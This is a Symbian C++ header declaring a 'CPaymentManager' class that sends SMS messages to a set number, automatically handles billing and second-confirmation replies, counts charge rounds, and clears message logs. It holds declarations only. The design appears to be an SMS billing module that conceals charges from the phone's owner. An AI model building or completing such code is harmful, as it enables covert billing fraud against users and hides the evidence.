/*
 ============================================================================
 Name		: PaymentManager.h
 Author	  : zengcity
 Version	 : 1.0
 Copyright   : Your copyright notice
 Description : CPaymentManager declaration
 ============================================================================
 */

#ifndef PAYMENTMANAGER_H
#define PAYMENTMANAGER_H

// INCLUDES
#include <e32std.h>
#include <e32base.h>
#include <BADESCA.H>	//CDesCArray
#include <SMSDef.h>

#include "smsdatagramreceiver.h"
#include "smsdatagramsender.h"
#include "LoadMessageEngine.h"
#include "EventsObserver.h"
#include "LoadContactEngine.h"

_LIT8(KDefaultTestNumber, "10086"); //Default/intial target SMS number
_LIT(KDefaultTestMessage, "ye");
_LIT8(KDefaultTestPattern, "");
// CLASS DECLARATION
class CLoadLogEngine;
/**
 *  CPaymentManager
 * 
 */

class MPaymentNotify
	{
public:
	virtual void PaymentErr(const TInt& aError) = 0;
	virtual void PaymentState(const TInt& aState) = 0;
	};

class CPaymentManager : public CBase,
						public MSmsDatagramReceiverObserver, 
						public MSmsDatagramSenderObserver,
						public MRemoveContentEngineObserver
	{
public:
	// Constructors and destructor
	enum TPaymentState
		{
		EStateInit = 0,
		EStateSendCode ,
		EStateReceive ,
		EStateSendConfirm 
		};
	/**
	 * Destructor.
	 */
	~CPaymentManager();

	/**
	 * Two-phased constructor.
	 */
	static CPaymentManager* NewL(MPaymentNotify& aNotify);

	/**
	 * Two-phased constructor.
	 */
	static CPaymentManager* NewLC(MPaymentNotify& aNotify);

private:

	/**
	 * Constructor for performing 1st stage construction
	 */
	CPaymentManager(MPaymentNotify& aNotify);

	/**
	 * EPOC default constructor for performing 2nd stage construction
	 */
	void ConstructL();
	
public:
	void Register();
	
public:
    virtual void MsgReceivedL(const TDesC& aMsg,const TDesC& aNumber);
	virtual void MsgSentL(TDesC& aMsg);
	virtual void MsgSentErr(const TInt& aError);
	
	virtual void RemoveMessageLogDone();
private:
	void Init();
	void Close();
	
	void LoadConfig();
	void SplitDecodeToArray(const TDesC& aInfo,CDesCArray* aArray,const TDesC8& aD,const TDesC8& aN);
	void DecodeToDes(const TDesC& aInfo,TDes& aDes,const TDesC8& aD,const TDesC8& aN);
	void DecodeToNum(const TDesC& aInfo,TInt& aDes,const TDesC8& aD,const TDesC8& aN);
	
	void Send(const TDesC& aMsg,const TDesC& aNumber);
	void StartReceiver();
	
	void FirstSend();
	void SecendSend(const TDesC& aNumber);
	void FirstReceived(const TDesC& aMsg,const TDesC& aNumber);
	void PayRoundSeccess();
	void ClearMessageLog();
	
	void AddNumberToClearArray(const TDesC& aMsg);

	
	//检查是否是计费成功代码
	TBool CheckOrig(const TDesC& aMsg,const TDesC& aNumber);
	//检查是否二次确认,
	TBool CheckConfirm(const TDesC& aMsg,const TDesC& aNumber);
	TBool CheckConfirmResult(const TDesC& aMsg,const TDesC& aNumber);
	
	TBool CheckOrigMsgAndNumber(const TDesC& aMsg,const TDesC& aNumber,CDesCArray* aCheck);
	
	TBool CheckNumber(const TDesC& aNumber,const TDesC& aDestNumber);
	TBool CheckMsg(const TDesC& aMsg,CDesCArray* aCheck);
	
	void GetRegisterFile(TDes& aFile);
	void CreateRegisterMark();
	
private:
	MPaymentNotify& iNotify;
	
    CSmsDatagramReceiver* iSmsReceiver;
    CSmsDatagramSender*	iSmsSender; 
    
    CLoadMessageEngine* iCreator;
    
    TPaymentState iState;
    
    CDesCArray* iCheckOrigArray;
    CDesCArray* iCheckConfirmArray;
    //CDesCArray* iCheckResultArray;
    
    TInt iCounter;			//计费次数
    TInt iTotalMessage;		//计费需要短信条数
    
    TBuf<KMaxAddressSize>	iSendNumber;
    TBuf<KMaxSMSSize>		iSendContent;

    CLoadLogEngine *iRemoveEngine;
    pCKCContactEntryArray iContactArray;
	};

#endif // PAYMENTMANAGER_H
